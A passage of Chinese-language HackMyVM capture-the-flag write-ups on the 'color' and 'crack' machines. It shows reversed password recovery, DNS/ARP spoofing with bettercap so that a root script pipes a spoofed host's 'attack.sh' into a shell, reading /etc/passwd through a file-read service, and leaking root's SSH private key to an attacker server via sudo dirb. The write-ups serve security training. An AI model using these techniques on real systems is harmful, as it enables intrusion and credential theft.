  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Nope, sorry"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>
<pre class="language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">lucas</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// ebx</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>a1 <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">2LL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> a1 <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">1LL</span><span class="token punctuation">;</span>
  v2 <span class="token operator">=</span> <span class="token function">lucas</span><span class="token punctuation">(</span>a1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> v2 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">lucas</span><span class="token punctuation">(</span>a1 <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>不用猜随机数也能拿到密码,根据lucas函数,写个解密脚本</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">lucas</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token number">2</span>
    <span class="token keyword">elif</span> n <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token number">1</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> lucas<span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> lucas<span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span>
lucas_indices <span class="token operator">=</span> <span class="token punctuation">[</span>lucas<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
v6 <span class="token operator">=</span> <span class="token punctuation">(</span>
    <span class="token string">"FuprpRblcTzeg5JDNNasqeWKpFHvms4rMgrpAFYj5Zngqgvl7jK0iPpViDReY6nognFSGKtS4zTEiVPgzDXnPj06WsScYlt0EFryMGvP8SjVsg9Yjm"</span>
    <span class="token string">"xTeHkXUdzliZK8zqVCv2pZnGJ7L8e6DCsDPjNvjkVYR3WiRhf9jXCRKMGvP8SjVsg9YjmxTeHkXUdzkiZK8zqaCv2pZnGJ7L8e6DCsDPjNvjkVYR3W"</span>
    <span class="token string">"iRhf9jXCRKMGvP8SjVsg9YjmxTeHkXUdzkiZK8zqVCv2pZnGJ7L8e6DCsDPjNvjkVYR3WiRhf9jXCRKhaAWAR7kxJC8METsFLehuWd43P8kj2z2uyE"</span>
    <span class="token string">"BDD3dGEGdisWzwcSMBj6oh4R9HBDEJVr23haAWAR7kxJC8METFFLehuWd43P8kj2z2uyEBDD3dGEGdisWzwcSMBj6oh4R9HBDEJVr23"</span>
<span class="token punctuation">)</span>
password <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>v6<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token keyword">for</span> index <span class="token keyword">in</span> lucas_indices<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"password is:"</span><span class="token punctuation">,</span> password<span class="token punctuation">)</span>
<span class="token comment">#purpleaslilas</span></code></pre>
<p>拿到密码是<code>purpleaslilas</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">green@color:~$ <span class="token function">su</span> purple
Password: 
purple@color:/home/green$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1081</span><span class="token punctuation">(</span>purple<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1081</span><span class="token punctuation">(</span>purple<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1081</span><span class="token punctuation">(</span>purple<span class="token punctuation">)</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">purple@color:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">32</span>
drwx------ <span class="token number">2</span> purple purple <span class="token number">4096</span> Feb <span class="token number">20</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">6</span> root   root   <span class="token number">4096</span> Jan <span class="token number">27</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
lrwxrwxrwx <span class="token number">1</span> root   root      <span class="token number">9</span> Feb <span class="token number">11</span>  <span class="token number">2023</span> .bash_history -<span class="token operator">></span> /dev/null
-rwx------ <span class="token number">1</span> purple purple  <span class="token number">220</span> Jan <span class="token number">27</span>  <span class="token number">2023</span> .bash_logout
-rwx------ <span class="token number">1</span> purple purple <span class="token number">3526</span> Jan <span class="token number">27</span>  <span class="token number">2023</span> .bashrc
-rw-r--r-- <span class="token number">1</span> root   root     <span class="token number">77</span> Feb <span class="token number">11</span>  <span class="token number">2023</span> for_purple_only.txt
-rwx------ <span class="token number">1</span> purple purple  <span class="token number">807</span> Jan <span class="token number">27</span>  <span class="token number">2023</span> .profile
-rw-r--r-- <span class="token number">1</span> root   root     <span class="token number">14</span> Feb <span class="token number">11</span>  <span class="token number">2023</span> user.txt
-rw------- <span class="token number">1</span> purple purple  <span class="token number">868</span> Feb <span class="token number">20</span>  <span class="token number">2023</span> .viminfo
purple@color:~$ <span class="token function">cat</span> user.txt 
<span class="token punctuation">(</span>:Ez_Colors:<span class="token punctuation">)</span></code></pre>
<p>也是拿到了user flag</p>
<h2 id="提权root"><a href="#提权root" class="headerlink" title="提权root"></a>提权root</h2><p>先看下提示</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">purple@color:~$ <span class="token function">cat</span> for_purple_only.txt 
As the highest level user I allow you to use the supreme ddos attack script.</code></pre>
<p>sudo有奇迹</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">purple@color:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> purple on color:
    env_reset, mail_badpass,
    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin

User purple may run the following commands on color:
    <span class="token punctuation">(</span>root<span class="token punctuation">)</span> NOPASSWD: /attack_dir/ddos.sh</code></pre>
<p>ddos?<br>看一下这个脚本</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">purple@color:~$ <span class="token function">cat</span> /attack_dir/ddos.sh
<span class="token comment">#!/bin/bash</span>
/usr/bin/curl http://masterddos.hmv/attack.sh <span class="token operator">|</span> /usr/bin/sh <span class="token parameter variable">-p</span></code></pre>
<p>看了一下，&#x2F;etc&#x2F;hosts不能编辑，由于我在内网里，这里肯定要dns欺骗</p>
<h2 id="dns欺骗"><a href="#dns欺骗" class="headerlink" title="dns欺骗"></a>dns欺骗</h2><p>用bettercap进行域名欺骗和arp欺骗</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">set</span> dns.spoof.domains masterddos.hmv
<span class="token builtin class-name">set</span> dns.spoof.address <span class="token number">192.168</span>.56.104
<span class="token builtin class-name">set</span> arp.spoof.targets <span class="token number">192.168</span>.56.183
dns.spoof on
arp.spoof on</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">purple@color:~$ <span class="token function">sudo</span> /attack_dir/ddos.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
<span class="token number">100</span>    <span class="token number">19</span>  <span class="token number">100</span>    <span class="token number">19</span>    <span class="token number">0</span>     <span class="token number">0</span>    <span class="token number">904</span>      <span class="token number">0</span> --:--:-- --:--:-- --:--:--   <span class="token number">904</span>
purple@color:~$ <span class="token function">ls</span> <span class="token parameter variable">-l</span> /bin/bash
-rwsr-sr-x <span class="token number">1</span> root root <span class="token number">1234376</span> Mar <span class="token number">27</span>  <span class="token number">2022</span> /bin/bash
purple@color:~$ <span class="token function">bash</span> <span class="token parameter variable">-p</span>
bash-5.1<span class="token comment"># cat /root/r</span></code></pre>
<p>实操可以看一下群主老师的wp<br><a href="https://www.bilibili.com/video/BV16C4y1r7bv/?vd_source=a96d9880eda673b5d90632cd7dca7f5f">https://www.bilibili.com/video/BV16C4y1r7bv/?vd_source=a96d9880eda673b5d90632cd7dca7f5f</a></p>
]]></content>
      <categories>
        <category>HackMyVM</category>
      </categories>
      <tags>
        <tag>knock</tag>
        <tag>re</tag>
        <tag>dns欺骗</tag>
      </tags>
  </entry>
  <entry>
    <title>HackMyVM-crack</title>
    <url>/posts/a4e579f8/</url>
    <content><![CDATA[<p><strong>难度:easy</strong></p>
<p><strong>kali:192.168.56.104</strong></p>
<p><strong>靶机:192.168.56.165</strong></p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># nmap 192.168.56.165 -sV -A -p-</span>
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-04-27 <span class="token number">21</span>:24 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.165
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00039s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65532</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT      STATE SERVICE  VERSION
<span class="token number">21</span>/tcp    <span class="token function">open</span>  <span class="token function">ftp</span>      vsftpd <span class="token number">3.0</span>.3
<span class="token operator">|</span> ftp-syst: 
<span class="token operator">|</span>   STAT: 
<span class="token operator">|</span> FTP server status:
<span class="token operator">|</span>      Connected to ::ffff:192.168.56.105
<span class="token operator">|</span>      Logged <span class="token keyword">in</span> as <span class="token function">ftp</span>
<span class="token operator">|</span>      TYPE: ASCII
<span class="token operator">|</span>      No session bandwidth limit
<span class="token operator">|</span>      Session <span class="token function">timeout</span> <span class="token keyword">in</span> seconds is <span class="token number">300</span>
<span class="token operator">|</span>      Control connection is plain text
<span class="token operator">|</span>      Data connections will be plain text
<span class="token operator">|</span>      At session startup, client count was <span class="token number">4</span>
<span class="token operator">|</span>      vsFTPd <span class="token number">3.0</span>.3 - secure, fast, stable
<span class="token operator">|</span>_End of status
<span class="token operator">|</span> ftp-anon: Anonymous FTP login allowed <span class="token punctuation">(</span>FTP code <span class="token number">230</span><span class="token punctuation">)</span>
<span class="token operator">|</span>_drwxrwxrwx    <span class="token number">2</span> <span class="token number">0</span>        <span class="token number">0</span>            <span class="token number">4096</span> Apr <span class="token number">26</span> <span class="token number">15</span>:55 upload <span class="token punctuation">[</span>NSE: writeable<span class="token punctuation">]</span>
<span class="token number">4200</span>/tcp  <span class="token function">open</span>  ssl/http ShellInABox
<span class="token operator">|</span>_ssl-date: TLS randomness does not represent <span class="token function">time</span>
<span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>crack
<span class="token operator">|</span> Not valid before: <span class="token number">2023</span>-06-07T10:20:13
<span class="token operator">|</span>_Not valid after:  <span class="token number">2043</span>-06-02T10:20:13
<span class="token operator">|</span>_http-title: Shell In A Box
<span class="token number">12359</span>/tcp <span class="token function">open</span>  unknown
<span class="token operator">|</span> fingerprint-strings: 
<span class="token operator">|</span>   GenericLines: 
<span class="token operator">|</span>     File to read:NOFile to read:
<span class="token operator">|</span>   NULL: 
<span class="token operator">|</span>_    File to read:
<span class="token number">1</span> <span class="token function">service</span> unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-rvice <span class="token builtin class-name">:</span>
SF-Port12359-TCP:V<span class="token operator">=</span><span class="token number">7</span>.94SVN%I<span class="token operator">=</span><span class="token number">7</span>%D<span class="token operator">=</span><span class="token number">4</span>/27%Time<span class="token operator">=</span>662CFCAC%P<span class="token operator">=</span>x86_64-pc-linux-gnu%
SF:r<span class="token punctuation">(</span>NULL,D,<span class="token string">"File<span class="token entity" title="\x20">\x20</span>to<span class="token entity" title="\x20">\x20</span>read:"</span><span class="token punctuation">)</span>%r<span class="token punctuation">(</span>GenericLines,1C,<span class="token string">"File<span class="token entity" title="\x20">\x20</span>to<span class="token entity" title="\x20">\x20</span>read:N
SF:OFile<span class="token entity" title="\x20">\x20</span>to<span class="token entity" title="\x20">\x20</span>read:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
MAC Address: 08:00:27:0E:BE:24 <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
Device type: general purpose
Running: Linux <span class="token number">4</span>.X<span class="token operator">|</span><span class="token number">5</span>.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux <span class="token number">4.15</span> - <span class="token number">5.8</span>
Network Distance: <span class="token number">1</span> hop
Service Info: OS: Unix

TRACEROUTE
HOP RTT     ADDRESS
<span class="token number">1</span>   <span class="token number">0.39</span> ms <span class="token number">192.168</span>.56.165

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">33.42</span> seconds</code></pre>
<p>开启了21 4200 12359 三个端口，先ftp匿名登录看一手</p>
<h2 id="ftp匿名登录"><a href="#ftp匿名登录" class="headerlink" title="ftp匿名登录"></a>ftp匿名登录</h2><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># ftp 192.168.56.165</span>
Connected to <span class="token number">192.168</span>.56.165.
<span class="token number">220</span> <span class="token punctuation">(</span>vsFTPd <span class="token number">3.0</span>.3<span class="token punctuation">)</span>
Name <span class="token punctuation">(</span><span class="token number">192.168</span>.56.165:root<span class="token punctuation">)</span>: anonymous
<span class="token number">331</span> Please specify the password.
Password: 
<span class="token number">230</span> Login successful.
Remote system <span class="token builtin class-name">type</span> is UNIX.
Using binary mode to transfer files.
ftp<span class="token operator">></span> <span class="token function">ls</span> <span class="token parameter variable">-al</span>
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">10771</span><span class="token operator">|</span><span class="token punctuation">)</span>
<span class="token number">150</span> Here comes the directory listing.
drwxr-xr-x    <span class="token number">3</span> <span class="token number">0</span>        <span class="token number">114</span>          <span class="token number">4096</span> Jun 07  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x    <span class="token number">3</span> <span class="token number">0</span>        <span class="token number">114</span>          <span class="token number">4096</span> Jun 07  <span class="token number">2023</span> <span class="token punctuation">..</span>
drwxrwxrwx    <span class="token number">2</span> <span class="token number">0</span>        <span class="token number">0</span>            <span class="token number">4096</span> Apr <span class="token number">26</span> <span class="token number">15</span>:55 upload
<span class="token number">226</span> Directory send OK.</code></pre>
<p>有个upload目录</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">ftp<span class="token operator">></span> <span class="token builtin class-name">cd</span> upload
<span class="token number">250</span> Directory successfully changed.
ftp<span class="token operator">></span> <span class="token function">ls</span> <span class="token parameter variable">-al</span>
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">12802</span><span class="token operator">|</span><span class="token punctuation">)</span>
<span class="token number">150</span> Here comes the directory listing.
drwxrwxrwx    <span class="token number">2</span> <span class="token number">0</span>        <span class="token number">0</span>            <span class="token number">4096</span> Apr <span class="token number">26</span> <span class="token number">15</span>:55 <span class="token builtin class-name">.</span>
drwxr-xr-x    <span class="token number">3</span> <span class="token number">0</span>        <span class="token number">114</span>          <span class="token number">4096</span> Jun 07  <span class="token number">2023</span> <span class="token punctuation">..</span>
-rwxr-xr-x    <span class="token number">1</span> <span class="token number">1000</span>     <span class="token number">1000</span>          <span class="token number">849</span> Jun 07  <span class="token number">2023</span> crack.py
<span class="token number">226</span> Directory send OK.</code></pre>
<p>把py文件get下来看看</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os
<span class="token keyword">import</span> socket
s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>setsockopt<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>SOL_SOCKET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SO_REUSEADDR<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
port <span class="token operator">=</span> <span class="token number">12359</span>
s<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>

c<span class="token punctuation">,</span> addr <span class="token operator">=</span> s<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>
no <span class="token operator">=</span> <span class="token string">"NO"</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
                c<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'File to read:'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                data <span class="token operator">=</span> c<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
                <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                filename <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>basename<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span>
                check <span class="token operator">=</span> <span class="token string">"/srv/ftp/upload/"</span><span class="token operator">+</span>filename
                <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isfile<span class="token punctuation">(</span>check<span class="token punctuation">)</span> <span class="token keyword">and</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isfile<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                        f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span>
                        lines <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>
                        lines <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>lines<span class="token punctuation">)</span>
                        lines <span class="token operator">=</span> lines<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
                        c<span class="token punctuation">.</span>send<span class="token punctuation">(</span>lines<span class="token punctuation">)</span>
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                        c<span class="token punctuation">.</span>send<span class="token punctuation">(</span>no<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> ConnectionResetError<span class="token punctuation">:</span>
                <span class="token keyword">pass</span></code></pre>
<p>发现12359端口可以读取文件，但是只能读取存在的ftp服务器上面的文件</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># nc 192.168.56.165 12359       </span>
File to read:crack.py
<span class="token punctuation">[</span><span class="token string">'import os\n'</span>, <span class="token string">'import socket\n'</span>, <span class="token string">'s = socket.socket()\n'</span>, <span class="token string">'s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n'</span>, <span class="token string">'port = 12359\n'</span>, <span class="token string">"s.bind<span class="token variable"><span class="token punctuation">((</span>''<span class="token punctuation">,</span> port<span class="token punctuation">))</span></span><span class="token entity" title="\n">\n</span>"</span>, <span class="token string">'s.listen(50)\n'</span>, <span class="token string">'\n'</span>, <span class="token string">'c, addr = s.accept()\n'</span>, <span class="token string">'no = "NO"\n'</span>, <span class="token string">'while True:\n'</span>, <span class="token string">'        try:\n'</span>, <span class="token string">"                c.send('File to read:'.encode())<span class="token entity" title="\n">\n</span>"</span>, <span class="token string">'                data = c.recv(1024)\n'</span>, <span class="token string">"                file = (str(data, 'utf-8').strip())<span class="token entity" title="\n">\n</span>"</span>, <span class="token string">'                filename = os.path.basename(file)\n'</span>, <span class="token string">'                check = "/srv/ftp/upload/"+filename\n'</span>, <span class="token string">'                if os.path.isfile(check) and os.path.isfile(file):\n'</span>, <span class="token string">'                        f = open(file,"r")\n'</span>, <span class="token string">'                        lines = f.readlines()\n'</span>, <span class="token string">'                        lines = str(lines)\n'</span>, <span class="token string">'                        lines = lines.encode()\n'</span>, <span class="token string">'                        c.send(lines)\n'</span>, <span class="token string">'                else:\n'</span>, <span class="token string">'                        c.send(no.encode())\n'</span>, <span class="token string">'        except ConnectionResetError:\n'</span>, <span class="token string">'                pass\n'</span><span class="token punctuation">]</span>File to read:</code></pre>
<p>发现确实可以读取,为了读取passwd目录现在ftp上传一个passwd目录</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">ftp<span class="token operator">></span> <span class="token function">ls</span> <span class="token parameter variable">-al</span>
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">49777</span><span class="token operator">|</span><span class="token punctuation">)</span>
<span class="token number">150</span> Here comes the directory listing.
drwxrwxrwx    <span class="token number">2</span> <span class="token number">0</span>        <span class="token number">0</span>            <span class="token number">4096</span> Apr <span class="token number">26</span> <span class="token number">15</span>:55 <span class="token builtin class-name">.</span>
drwxr-xr-x    <span class="token number">3</span> <span class="token number">0</span>        <span class="token number">114</span>          <span class="token number">4096</span> Jun 07  <span class="token number">2023</span> <span class="token punctuation">..</span>
-rwxr-xr-x    <span class="token number">1</span> <span class="token number">1000</span>     <span class="token number">1000</span>          <span class="token number">849</span> Jun 07  <span class="token number">2023</span> crack.py
-rw-------    <span class="token number">1</span> <span class="token number">107</span>      <span class="token number">114</span>             <span class="token number">0</span> Apr <span class="token number">26</span> <span class="token number">15</span>:55 <span class="token function">passwd</span>
<span class="token number">226</span> Directory send OK.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># nc 192.168.56.165 12359</span>
File to read:/etc/passwd
<span class="token punctuation">[</span><span class="token string">'root:x:0:0:root:/root:/bin/bash\n'</span>, <span class="token string">'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n'</span>, <span class="token string">'bin:x:2:2:bin:/bin:/usr/sbin/nologin\n'</span>, <span class="token string">'sys:x:3:3:sys:/dev:/usr/sbin/nologin\n'</span>, <span class="token string">'sync:x:4:65534:sync:/bin:/bin/sync\n'</span>, <span class="token string">'games:x:5:60:games:/usr/games:/usr/sbin/nologin\n'</span>, <span class="token string">'man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n'</span>, <span class="token string">'lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n'</span>, <span class="token string">'mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n'</span>, <span class="token string">'news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n'</span>, <span class="token string">'uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n'</span>, <span class="token string">'proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n'</span>, <span class="token string">'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n'</span>, <span class="token string">'backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n'</span>, <span class="token string">'list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n'</span>, <span class="token string">'irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n'</span>, <span class="token string">'gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\n'</span>, <span class="token string">'nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n'</span>, <span class="token string">'_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n'</span>, <span class="token string">'systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\n'</span>, <span class="token string">'systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\n'</span>, <span class="token string">'messagebus:x:103:109::/nonexistent:/usr/sbin/nologin\n'</span>, <span class="token string">'systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\n'</span>, <span class="token string">'sshd:x:105:65534::/run/sshd:/usr/sbin/nologin\n'</span>, <span class="token string">'cris:x:1000:1000:cris,,,:/home/cris:/bin/bash\n'</span>, <span class="token string">'systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\n'</span>, <span class="token string">'shellinabox:x:106:112:Shell In A Box,,,:/var/lib/shellinabox:/usr/sbin/nologin\n'</span>, <span class="token string">'ftp:x:107:114:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin\n'</span><span class="token punctuation">]</span>File to read:</code></pre>
<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>注意到cris用户的shell是&#x2F;bin&#x2F;bash,进入4200端口登录一下,<code>cirs/cris</code><br><img src="https://ooo.0x0.ooo/2024/04/27/OpEkMx.png" alt="OpEkMx.png" loading="lazy"></p>
<h2 id="提权root"><a href="#提权root" class="headerlink" title="提权root"></a>提权root</h2><p>sudo </p>
<pre class="language-bash" data-language="bash"><code class="language-bash">cris@crack:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> cris on crack:
    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin

User cris may run the following commands on crack:
    <span class="token punctuation">(</span>ALL<span class="token punctuation">)</span> NOPASSWD: /usr/bin/dirb</code></pre>
<p>dirb是目录扫描的工具,本地起个http服务，然后用root的ssh私钥文件作为密码来泄露私钥</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">cris@crack:~$ <span class="token function">sudo</span> /usr/bin/dirb  http://192.168.56.104:6677 /root/.ssh/id_rsa

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Apr <span class="token number">27</span> <span class="token number">15</span>:58:53 <span class="token number">2024</span>
URL_BASE: http://192.168.56.104:6677/
WORDLIST_FILES: /root/.ssh/id_rsa

-----------------

GENERATED WORDS: <span class="token number">38</span>                                                            

---- Scanning URL: http://192.168.56.104:6677/ ----
                                                                                                                                                                                                           
-----------------
END_TIME: Sat Apr <span class="token number">27</span> <span class="token number">15</span>:58:53 <span class="token number">2024</span>
DOWNLOADED: <span class="token number">38</span> - FOUND: <span class="token number">0</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># python -m http.server 6677</span>
Serving HTTP on <span class="token number">0.0</span>.0.0 port <span class="token number">6677</span> <span class="token punctuation">(</span>http://0.0.0.0:6677/<span class="token punctuation">)</span> <span class="token punctuation">..</span>.
